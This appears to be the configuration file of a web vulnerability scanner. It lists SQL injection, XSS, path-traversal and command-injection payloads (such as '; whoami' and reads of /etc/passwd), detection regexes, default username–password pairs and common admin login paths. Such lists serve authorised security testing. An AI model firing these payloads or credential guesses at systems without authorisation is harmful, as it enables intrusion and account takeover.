"""Configuration and constants for vulnerability scanner"""

# HTTP Configuration
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
REQUEST_TIMEOUT = 10
MAX_SPIDER_DEPTH = 2
MAX_URLS_TO_TEST = 10

# SQL Injection
SQL_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin'--",
    "1' AND '1'='1",
    "1' UNION SELECT NULL--",
    "' WAITFOR DELAY '0:0:5'--"
]

SQL_ERROR_PATTERNS = [
    'SQL syntax.*MySQL',
    'Warning.*mysql_.*',
    'valid MySQL result',
    'MySqlClient\.',
    'PostgreSQL.*ERROR',
    'Warning.*pg_.*',
    'valid PostgreSQL result',
    'Npgsql\.',
    'Driver.*SQL.*Server',
    'OLE DB.*SQL Server',
    'Microsoft SQL Native Client error',
    'SQLServer JDBC Driver',
    'Oracle error',
    'Oracle.*Driver',
    'Warning.*oci_.*',
    'SQLite/JDBCDriver',
    'SQLite.Exception',
    'System.Data.SQLite.SQLiteException'
]

# XSS
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    'javascript:alert(1)',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
]

# LFI
LFI_PAYLOADS = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '....//....//....//etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '/etc/passwd',
    'C:\\windows\\system32\\drivers\\etc\\hosts',
    'file:///etc/passwd',
    '../../../../../../../../../etc/passwd'
]

LFI_UNIX_PATTERN = r'root:.*:0:0:'
LFI_WINDOWS_PATTERN = r'# Copyright.*Microsoft'

# RCE
RCE_PAYLOADS = [
    '; whoami',
    '| whoami',
    '& whoami',
    '`whoami`',
    '$(whoami)',
    '; id',
    '| id',
    '& id'
]

RCE_PATTERNS = [
    r'uid=\d+\(\w+\) gid=\d+\(\w+\)',  # Linux id command
    r'nt authority\\system',  # Windows whoami
    r'[a-z]+\\[a-z]+',  # Windows domain\user
]

# Authentication
DEFAULT_CREDENTIALS = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '123456'),
    ('administrator', 'administrator'),
    ('root', 'root'),
    ('root', 'toor'),
    ('test', 'test'),
    ('guest', 'guest'),
    ('admin', ''),
    ('', 'admin')
]

LOGIN_PATHS = [
    '/login',
    '/admin',
    '/admin/login',
    '/administrator',
    '/wp-admin',
    '/user/login',
    '/auth/login',
    '/signin',
    '/console'
]

# Security Headers
SECURITY_HEADERS = {
    'Strict-Transport-Security': 'HSTS not implemented',
    'Content-Security-Policy': 'CSP not implemented',
    'X-Frame-Options': 'Clickjacking protection missing',
    'X-Content-Type-Options': 'MIME sniffing protection missing',
    'X-XSS-Protection': 'XSS protection header missing',
    'Referrer-Policy': 'Referrer policy not set',
    'Permissions-Policy': 'Permissions policy not set'
}